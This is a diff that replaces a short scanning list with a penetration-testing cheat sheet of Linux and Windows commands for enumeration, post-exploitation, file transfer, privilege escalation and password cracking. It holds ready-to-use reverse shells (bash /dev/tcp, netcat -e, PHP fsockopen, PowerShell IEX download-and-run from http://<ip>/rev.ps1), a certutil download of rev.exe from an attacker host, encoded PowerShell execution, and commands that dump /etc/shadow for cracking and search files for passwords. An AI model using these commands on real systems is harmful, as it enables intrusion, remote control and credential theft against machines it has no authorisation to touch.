@@ -1,12 +1,100 @@
-python3 -m http.server
---------------------------------
-nmap -p 1-65535 -A -T4 -sV -sC <ip> 
-nmap --top-ports 20 <ip>
-nmap -Pn --script vuln <ip>
-----------------------------
-nc -nv <ip>
-----------------------------
+
+=== 🔧 Linux Post-Exploit Commands ===
+find / -perm -4000 2>/dev/null                  # Find SUID binaries
+find / -type f -name '*.bak' 2>/dev/null         # Backup files
+getcap -r / 2>/dev/null                          # Get file capabilities
+cat /etc/passwd | cut -d: -f1                    # List users
+grep -i 'password' /etc/*                        # Look for passwords in config files
+
+=== 🪟 Windows Post-Exploit Commands ===
+whoami /priv                                     # Check privileges
+net users                                        # List local users
+net localgroup administrators                    # List admins
+icacls C:\ /T /C /Q                             # List permissions recursively
+certutil -urlcache -split -f http://<ip>/rev.exe rev.exe   # Download file from attacker
+powershell -enc <base64>                         # Execute encoded PowerShell payload
+
+=== 🧪 Enumeration ===
+nmap -sC -sV -oN nmap.txt <ip>                   # Default script and version scan
+enum4linux -a <ip>                               # SMB enumeration
+smbclient -L //<ip>                              # List SMB shares
+snmpwalk -v1 -c public <ip>                      # SNMP enumeration
+ldapsearch -x -h <ip> -s base                    # LDAP base search
+nc -nv <ip>										 #Netcat scan
 gobuster dir -u https://example.com -w /Discovery/Web-Content/common.txt
 gobuster fuzz -u "http://example.com/index.php?page=FUZZ" -w /Fuzzing/LFI-fuzzing.txt
 
-https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
+=== 🐚 Reverse Shells ===
+bash -i >& /dev/tcp/<ip>/4444 0>&1               # Bash reverse shell
+python3 -c 'import pty; pty.spawn("/bin/bash")' # Spawn TTY shell
+nc -e /bin/bash <ip> 4444                        # Netcat reverse shell
+php -r '$sock=fsockopen("<ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://<ip>/rev.ps1')
+
+=== 🔁 File Transfer ===
+python3 -m http.server 80                        # Start web server (Python 3)
+scp file.txt user@<ip>:/tmp                      # Copy file via SCP
+wget http://<ip>/file.txt                        # Download via wget
+curl -O http://<ip>/file.txt                     # Download via curl
+
+=== 📈 Privilege Escalation Checks ===
+sudo -l                                          # Check sudo permissions
+pspy64                                           # Monitor processes without root
+linpeas.sh                                       # Linux privesc script
+winPEAS.exe                                      # Windows privesc script
+Get-ProcessMitigation -Name <binary>             # Windows exploit mitigation check
+
+=== 🔍 Nmap Usage ===
+nmap -sV -sC <ip>                      # Version detection and default scripts
+nmap -A <ip>                           # Aggressive scan (OS, version, script, traceroute)
+nmap -p- <ip>                          # Scan all 65535 ports
+nmap -sU -p 161 <ip>                   # UDP scan (e.g. SNMP)
+nmap -Pn <ip>                          # Disable ping, treat host as up
+nmap -p 22,80,443 <ip>                 # Scan specific ports
+nmap --script vuln <ip>               # Run vulnerability detection scripts
+nmap -oA output <ip>                   # Output in all formats (output.nmap, .xml, .gnmap)
+nmap --script=http-enum <ip>          # Enumerate HTTP directories
+nmap -sS -T4 <ip>                      # Stealth SYN scan with faster timing
+
+=== 🧰 Useful Linux Commands ===
+dpkg -l                                 # List installed packages (Debian-based)
+rpm -qa                                 # List installed packages (RedHat-based)
+netstat -tulnp                          # Show listening ports
+lsof -i                                 # Open network sockets
+history | grep <cmd>                    # Search command history
+uname -a                                # Kernel version
+df -h                                   # Disk usage
+top / htop                              # Process monitor
+alias ll='ls -la'                       # Custom command aliasing
+echo $PATH                              # Show system PATH
+export PATH=$PATH:/custom/path          # Temporarily modify PATH
+
+=== 🪟 Useful Windows Commands ===
+systeminfo                              # System version and info
+tasklist                                 # Running processes
+netstat -ano                             # Active network connections with PID
+wmic useraccount get name,sid           # List usernames and their SIDs
+schtasks /query /fo LIST /v             # List scheduled tasks verbosely
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run  # Auto-run programs
+dir /a /s C:\ | findstr password        # Search for 'password' in files
+findstr /si password *.txt *.xml *.ini   # Find passwords in configs
+
+=== 📂 File Permissions & Users ===
+ls -la                                   # List with permissions
+id                                       # Current user ID and groups
+groups                                   # Groups current user belongs to
+chmod +x script.sh                       # Make file executable
+chown user:user file.txt                 # Change ownership
+
+=== 🔐 Password Extraction / Hashes ===
+cat /etc/shadow                          # (root only) stored hashes
+unshadow /etc/passwd /etc/shadow > crack.txt  # Prepare for John the Ripper
+john --wordlist=rockyou.txt crack.txt    # Run John the Ripper
+hashcat -m 0 -a 0 hashes.txt wordlist.txt # Hashcat basic example
+
+=== 🔂 Looping / Forensics / Misc ===
+for i in $(seq 1 254); do ping -c 1 192.168.1.$i | grep '64 bytes'; done   # Ping sweep
+strings binary_file | grep 'interesting'                                  # Look inside binaries
+xxd file.bin                                                                # Hexdump view
+base64 -d encoded.txt                                                       # Decode base64
+echo 'hello' | base64                                                       # Encode base64
